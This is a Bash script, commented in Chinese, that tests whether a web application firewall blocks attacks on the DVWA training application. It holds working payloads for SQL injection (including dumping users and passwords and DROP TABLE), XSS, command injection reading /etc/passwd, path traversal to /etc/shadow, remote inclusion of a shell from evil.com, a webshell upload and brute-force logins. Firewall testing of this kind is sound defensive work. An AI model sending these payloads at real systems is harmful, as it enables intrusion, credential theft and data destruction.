#!/bin/bash

# WAF流量检测测试脚本 - DVWA目标版本
# 测试WAF对DVWA应用的保护能力

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 目标应用地址 (通过WAF代理)
TARGET_HOST="${TARGET_HOST:-10.211.55.3}"
TARGET_PATH="${TARGET_PATH:-/dvwa}"
WAF_HOST="${WAF_HOST:-localhost}"
WAF_PORT="${WAF_PORT:-2333}"

# 通过WAF访问DVWA
WAF_URL="http://${WAF_HOST}:${WAF_PORT}"
DVWA_URL="${WAF_URL}${TARGET_PATH}"

# 测试计数器
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# 打印分隔线
print_separator() {
    echo -e "${BLUE}========================================${NC}"
}

# 打印测试标题
print_test_title() {
    echo ""
    print_separator
    echo -e "${YELLOW}测试 #$TOTAL_TESTS: $1${NC}"
    print_separator
}

# 打印测试结果
print_result() {
    local status=$1
    local message=$2
    
    if [ "$status" == "PASS" ]; then
        echo -e "${GREEN}✓ PASS${NC}: $message"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "${RED}✗ FAIL${NC}: $message"
        FAILED_TESTS=$((FAILED_TESTS + 1))
    fi
}

# 执行HTTP请求并检查响应
test_request() {
    local description="$1"
    local url="$2"
    local method="${3:-GET}"
    local data="$4"
    local expected_block="${5:-false}"
    local extra_headers="$6"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    print_test_title "$description"
    
    echo "请求URL: $url"
    echo "请求方法: $method"
    if [ -n "$data" ]; then
        echo "请求数据: $data"
    fi
    echo "预期结果: $([ "$expected_block" == "true" ] && echo "被拦截" || echo "正常通过")"
    echo ""
    
    # 构建curl命令
    curl_cmd="curl -s -w '\n%{http_code}' -X $method"
    curl_cmd="$curl_cmd -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'"
    
    if [ -n "$extra_headers" ]; then
        curl_cmd="$curl_cmd $extra_headers"
    fi
    
    if [ "$method" == "POST" ] && [ -n "$data" ]; then
        curl_cmd="$curl_cmd -d '$data'"
    fi
    
    curl_cmd="$curl_cmd '$url'"
    
    # 执行请求
    response=$(eval $curl_cmd 2>&1)
    
    # 提取HTTP状态码
    http_code=$(echo "$response" | tail -n1)
    response_body=$(echo "$response" | sed '$d')
    
    echo "HTTP状态码: $http_code"
    echo "响应内容: ${response_body:0:200}"
    
    # 判断是否被拦截
    if [ "$expected_block" == "true" ]; then
        if [ "$http_code" == "403" ] || [ "$http_code" == "406" ] || echo "$response_body" | grep -qi "blocked\|forbidden\|rejected\|not acceptable"; then
            print_result "PASS" "恶意请求已被成功拦截 (HTTP $http_code)"
        else
            print_result "FAIL" "恶意请求未被拦截 (HTTP $http_code) ⚠️"
        fi
    else
        if [ "$http_code" == "200" ] || [ "$http_code" == "301" ] || [ "$http_code" == "302" ] || [ "$http_code" == "404" ]; then
            print_result "PASS" "正常请求通过 (HTTP $http_code)"
        else
            print_result "FAIL" "正常请求被误拦截 (HTTP $http_code)"
        fi
    fi
}

# 主测试函数
main() {
    echo -e "${BLUE}"
    echo "╔════════════════════════════════════════╗"
    echo "║   WAF 流量检测测试 - DVWA目标          ║"
    echo "║   Testing WAF Protection for DVWA      ║"
    echo "╚════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo "WAF地址: $WAF_URL"
    echo "DVWA目标: $TARGET_HOST$TARGET_PATH"
    echo "通过WAF访问: $DVWA_URL"
    echo ""
    
    # 检查WAF服务是否可访问
    echo "检查WAF服务状态..."
    if ! curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$WAF_URL" > /dev/null 2>&1; then
        echo -e "${RED}错误: 无法连接到WAF服务 $WAF_URL${NC}"
        echo "请确认服务已启动: docker ps"
        exit 1
    fi
    echo -e "${GREEN}WAF服务正常运行${NC}"
    echo ""
    
    sleep 1
    
    # ==================== 正常流量测试 ====================
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第一部分: 正常流量测试${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "正常访问DVWA首页" \
        "$DVWA_URL/" \
        "GET" \
        "" \
        "false"
    
    test_request \
        "正常访问DVWA登录页面" \
        "$DVWA_URL/login.php" \
        "GET" \
        "" \
        "false"
    
    test_request \
        "正常访问DVWA设置页面" \
        "$DVWA_URL/setup.php" \
        "GET" \
        "" \
        "false"
    
    # ==================== SQL注入攻击测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第二部分: SQL注入攻击测试 (DVWA SQL Injection)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "SQL注入 - DVWA SQL Injection页面 UNION SELECT" \
        "$DVWA_URL/vulnerabilities/sqli/?id=1' UNION SELECT null,database()--&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "SQL注入 - OR 1=1 绕过认证" \
        "$DVWA_URL/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "SQL注入 - 盲注时间延迟" \
        "$DVWA_URL/vulnerabilities/sqli_blind/?id=1' AND SLEEP(5)--&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "SQL注入 - 布尔盲注" \
        "$DVWA_URL/vulnerabilities/sqli_blind/?id=1' AND 1=1--&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "SQL注入 - UNION SELECT 获取用户表" \
        "$DVWA_URL/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users--&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "SQL注入 - 注释绕过" \
        "$DVWA_URL/vulnerabilities/sqli/?id=1';DROP TABLE users;--&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    # ==================== XSS跨站脚本攻击测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第三部分: XSS跨站脚本攻击测试 (DVWA XSS)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "XSS攻击 - 反射型XSS基本script标签" \
        "$DVWA_URL/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "XSS攻击 - 反射型XSS img标签" \
        "$DVWA_URL/vulnerabilities/xss_r/?name=<img src=x onerror=alert('XSS')>" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "XSS攻击 - 存储型XSS" \
        "$DVWA_URL/vulnerabilities/xss_s/" \
        "POST" \
        "txtName=<script>alert('Stored XSS')</script>&mtxMessage=test&btnSign=Sign Guestbook" \
        "true"
    
    test_request \
        "XSS攻击 - DOM型XSS" \
        "$DVWA_URL/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "XSS攻击 - JavaScript协议" \
        "$DVWA_URL/vulnerabilities/xss_r/?name=javascript:alert('XSS')" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "XSS攻击 - 事件处理器" \
        "$DVWA_URL/vulnerabilities/xss_r/?name=<body onload=alert('XSS')>" \
        "GET" \
        "" \
        "true"
    
    # ==================== 命令注入攻击测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第四部分: 命令注入攻击测试 (DVWA Command Injection)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "命令注入 - 管道符读取passwd" \
        "$DVWA_URL/vulnerabilities/exec/?ip=127.0.0.1 | cat /etc/passwd&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "命令注入 - 分号分隔命令" \
        "$DVWA_URL/vulnerabilities/exec/?ip=127.0.0.1;whoami&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "命令注入 - AND运算符" \
        "$DVWA_URL/vulnerabilities/exec/?ip=127.0.0.1 && ls -la&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "命令注入 - 反引号命令替换" \
        "$DVWA_URL/vulnerabilities/exec/?ip=\`whoami\`&Submit=Submit" \
        "GET" \
        "" \
        "true"
    
    # ==================== 文件包含攻击测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第五部分: 文件包含攻击测试 (DVWA File Inclusion)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "本地文件包含 - 读取/etc/passwd" \
        "$DVWA_URL/vulnerabilities/fi/?page=../../../../etc/passwd" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "本地文件包含 - 读取系统配置" \
        "$DVWA_URL/vulnerabilities/fi/?page=../../../../../../../etc/shadow" \
        "GET" \
        "" \
        "true"
    
    test_request \
        "远程文件包含 - 加载远程脚本" \
        "$DVWA_URL/vulnerabilities/fi/?page=http://evil.com/shell.php" \
        "GET" \
        "" \
        "true"
    
    # ==================== 文件上传攻击测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第六部分: 文件上传攻击测试 (DVWA File Upload)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "恶意文件上传 - PHP WebShell" \
        "$DVWA_URL/vulnerabilities/upload/" \
        "POST" \
        "MAX_FILE_SIZE=100000" \
        "true" \
        "-F 'uploaded=@-;filename=shell.php' -F 'Upload=Upload'"
    
    # ==================== CSRF攻击测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第七部分: CSRF跨站请求伪造测试 (DVWA CSRF)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "CSRF攻击 - 修改密码请求" \
        "$DVWA_URL/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" \
        "GET" \
        "" \
        "false"  # CSRF通常需要检查Referer和Token，单纯URL可能不被拦截
    
    # ==================== 弱会话ID测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第八部分: 弱会话ID测试 (DVWA Weak Session IDs)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    test_request \
        "弱会话ID - 访问会话ID页面" \
        "$DVWA_URL/vulnerabilities/weak_id/" \
        "GET" \
        "" \
        "false"
    
    # ==================== 暴力破解测试 ====================
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}第九部分: 暴力破解测试 (DVWA Brute Force)${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # 模拟快速多次登录尝试
    echo "模拟暴力破解登录（5次快速尝试）..."
    for i in {1..5}; do
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        curl -s "$DVWA_URL/vulnerabilities/brute/?username=admin&password=pass$i&Login=Login" > /dev/null
        echo "  尝试 $i/5..."
    done
    echo "如果WAF有速率限制，后续请求应被拦截"
    
    # ==================== 测试总结 ====================
    echo ""
    echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║           测试结果总结                 ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    echo ""
    echo "总测试数: $TOTAL_TESTS"
    echo -e "${GREEN}通过: $PASSED_TESTS${NC}"
    echo -e "${RED}失败: $FAILED_TESTS${NC}"
    
    # 计算通过率
    if [ $TOTAL_TESTS -gt 0 ]; then
        pass_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
        echo "通过率: ${pass_rate}%"
    fi
    
    echo ""
    echo "=== WAF保护建议 ==="
    echo "1. 检查WAF管理界面 http://localhost:2333 查看详细日志"
    echo "2. 确认攻击请求已被记录和分类"
    echo "3. 验证告警通知是否正常触发"
    echo "4. 检查误报率（正常请求被拦截的情况）"
    echo ""
    
    if [ $FAILED_TESTS -eq 0 ]; then
        echo -e "${GREEN}✓✓✓ 所有测试通过! WAF对DVWA提供了完善的保护 ✓✓✓${NC}"
        exit 0
    elif [ $pass_rate -ge 80 ]; then
        echo -e "${YELLOW}⚠ 大部分测试通过，但仍需优化WAF规则 ⚠${NC}"
        exit 1
    else
        echo -e "${RED}✗✗✗ 多项测试失败，WAF防护能力不足，请检查配置 ✗✗✗${NC}"
        exit 2
    fi
}

# 运行主函数
main
